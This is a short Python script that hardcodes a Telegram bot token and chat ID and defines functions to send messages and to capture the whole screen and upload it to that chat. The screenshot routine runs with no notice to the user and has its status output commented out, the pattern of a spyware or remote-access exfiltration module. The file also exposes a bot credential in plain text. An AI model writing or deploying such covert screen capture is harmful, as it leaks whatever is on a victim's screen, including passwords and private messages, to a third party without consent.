import requests
import io
import pyautogui
from PIL import Image

TOKEN = "7423490445:AAGN3zK7N97YsfEHzqY6aRuIjV5rwO0Ewf0"
CHAT_ID = "1559668342"

def sendMessage(MESSAGE):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": MESSAGE}

    response = requests.post(url, json=payload)

def sendScreenshot():
    # Take screenshot using pyautogui
    screenshot = pyautogui.screenshot()

    # Save image to memory (BytesIO buffer)
    buffer = io.BytesIO()
    screenshot.save(buffer, format='PNG')
    buffer.seek(0)

    # Send image via Telegram
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    files = {'photo': buffer}
    data = {'chat_id': CHAT_ID}

    response = requests.post(url, files=files, data=data)
    # if response.status_code == 200:
    #     print("📸 Screenshot sent!")
    # else:
    #     print("❌ Failed to send screenshot:", response.text)
    
